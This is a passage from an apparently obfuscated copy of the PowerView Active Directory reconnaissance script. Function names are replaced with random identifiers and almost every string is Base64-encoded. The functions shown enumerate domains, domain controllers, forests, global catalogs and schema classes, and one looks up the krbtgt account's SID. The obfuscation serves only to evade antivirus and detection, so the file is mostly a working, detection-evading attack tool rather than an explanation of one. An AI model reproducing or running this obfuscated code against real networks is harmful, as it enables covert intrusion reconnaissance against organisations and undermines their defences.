            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBEAG8AbQBhAGkAbgA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                $TargetDomain = $Domain
            }
            else {
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAFQAYQByAGcAZQB0AEQAbwBtAGEAaQBuACcAIABmAHIAbwBtACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            ${dd8ac5628e40487fbf660b8f53c1b54f} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${dd8ac5628e40487fbf660b8f53c1b54f})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAVABhAHIAZwBlAHQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACwAIABvAHIAIAB0AGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAYQByAGUAIABpAG4AdgBhAGwAaQBkADoAIAAkAF8A')))
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${dd8ac5628e40487fbf660b8f53c1b54f} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${dd8ac5628e40487fbf660b8f53c1b54f})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACAAOgAgACQAXwA=')))
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAZABvAG0AYQBpAG4AOgAgACQAXwA=')))
            }
        }
    }
}
function cd8c63b899224544917fb2ed84dfed27 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Switch]
        ${d6425fbac1ed46aaa05783be216638a4},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${939bb917a0214f1496064068e1609800} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
            cec1def5409041f78ed8ecd436f7fa52 @939bb917a0214f1496064068e1609800
        }
        else {
            ${6d94566bdb0646b6b83c94bdab9f00ed} = c57d9aa48a49482b961291cafd0dde18 @939bb917a0214f1496064068e1609800
            if (${6d94566bdb0646b6b83c94bdab9f00ed}) {
                ${6d94566bdb0646b6b83c94bdab9f00ed}.DomainControllers
            }
        }
    }
}
function a1f50b6c1bc641b48c8648605758f288 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBGAG8AcgBlAHMAdAA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
                ${15e078f382fd495aad92d62d30486fef} = $Forest
            }
            else {
                ${15e078f382fd495aad92d62d30486fef} = $Credential.GetNetworkCredential().Domain
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAEYAbwByAGUAcwB0ACcAIABmAHIAbwBtACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            ${0438a24f2ec94feaa5a651214b72febf} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), ${15e078f382fd495aad92d62d30486fef}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                ${8e4677c94f1147218d2e676f59fc07d7} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${0438a24f2ec94feaa5a651214b72febf})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZgBvAHIAZQBzAHQAIAAnACQAewAxADUAZQAwADcAOABmADMAOAAyAGYAZAA0ADkANQBhAGEAZAA5ADIAZAA2ADIAZAAzADAANAA4ADYAZgBlAGYAfQAnACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0ACwAIABjAG8AdQBsAGQAIABuAG8AdAAgAGIAZQAgAGMAbwBuAHQAYQBjAHQAZQBkACwAIAB0AGgAZQByAGUAIABpAHMAbgAnAHQAIABhAG4AIABlAHgAaQBzAHQAaQBuAGcAIAB0AHIAdQBzAHQALAAgAG8AcgAgAHQAaABlACAAcwBwAGUAYwBpAGYAaQBlAGQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABhAHIAZQAgAGkAbgB2AGEAbABpAGQAOgAgACQAXwA=')))
                $Null
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
            ${0438a24f2ec94feaa5a651214b72febf} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Forest)
            try {
                ${8e4677c94f1147218d2e676f59fc07d7} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${0438a24f2ec94feaa5a651214b72febf})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZgBvAHIAZQBzAHQAIAAnACQARgBvAHIAZQBzAHQAJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ADoAIAAkAF8A')))
                return $Null
            }
        }
        else {
            ${8e4677c94f1147218d2e676f59fc07d7} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if (${8e4677c94f1147218d2e676f59fc07d7}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${70aafd5724604acb884b9ccd8aed3ff9} = (c4bfd1c2423d4aa09ab761a468a38f7e -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain ${8e4677c94f1147218d2e676f59fc07d7}.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                ${70aafd5724604acb884b9ccd8aed3ff9} = (c4bfd1c2423d4aa09ab761a468a38f7e -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain ${8e4677c94f1147218d2e676f59fc07d7}.RootDomain.Name).objectsid
            }
            ${372dd4b251bb473babaef2b053830ee6} = ${70aafd5724604acb884b9ccd8aed3ff9} -Split '-'
            ${70aafd5724604acb884b9ccd8aed3ff9} = ${372dd4b251bb473babaef2b053830ee6}[0..$(${372dd4b251bb473babaef2b053830ee6}.length-2)] -join '-'
            ${8e4677c94f1147218d2e676f59fc07d7} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) ${70aafd5724604acb884b9ccd8aed3ff9}
            ${8e4677c94f1147218d2e676f59fc07d7}
        }
    }
}
function Get-ForestDomain {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${939bb917a0214f1496064068e1609800} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${8e4677c94f1147218d2e676f59fc07d7} = a1f50b6c1bc641b48c8648605758f288 @939bb917a0214f1496064068e1609800
        if (${8e4677c94f1147218d2e676f59fc07d7}) {
            ${8e4677c94f1147218d2e676f59fc07d7}.Domains
        }
    }
}
function Get-ForestGlobalCatalog {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${939bb917a0214f1496064068e1609800} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${8e4677c94f1147218d2e676f59fc07d7} = a1f50b6c1bc641b48c8648605758f288 @939bb917a0214f1496064068e1609800
        if (${8e4677c94f1147218d2e676f59fc07d7}) {
            ${8e4677c94f1147218d2e676f59fc07d7}.FindAllGlobalCatalogs()
        }
    }
}
function Get-ForestSchemaClass {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${939bb917a0214f1496064068e1609800} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${939bb917a0214f1496064068e1609800}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${8e4677c94f1147218d2e676f59fc07d7} = a1f50b6c1bc641b48c8648605758f288 @939bb917a0214f1496064068e1609800
        if (${8e4677c94f1147218d2e676f59fc07d7}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzAE4AYQBtAGUA')))]) {
                ForEach (${214e747f515b46e9a927bef7a97ef7e6} in $ClassName) {
                    ${8e4677c94f1147218d2e676f59fc07d7}.Schema.FindClass(${214e747f515b46e9a927bef7a97ef7e6})
                }
            }
            else {
                ${8e4677c94f1147218d2e676f59fc07d7}.Schema.FindAllClasses()
            }
        }
    }
}
function Find-DomainObjectPropertyOutlier {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${d1671daeb7d747c18cb18101525e4131} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAcABsAGEAeQBuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBpAHYAZQBuAG4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdAB0AGkAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),'sn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${47606c75b82746f2ac36a1477912f866} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB5AHMAdABlAG0AZgBsAGEAZwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${9f0806a1a549491cac775940d73dbbc3} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAHAAbwBsAGkAYwB5AGYAbABhAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.En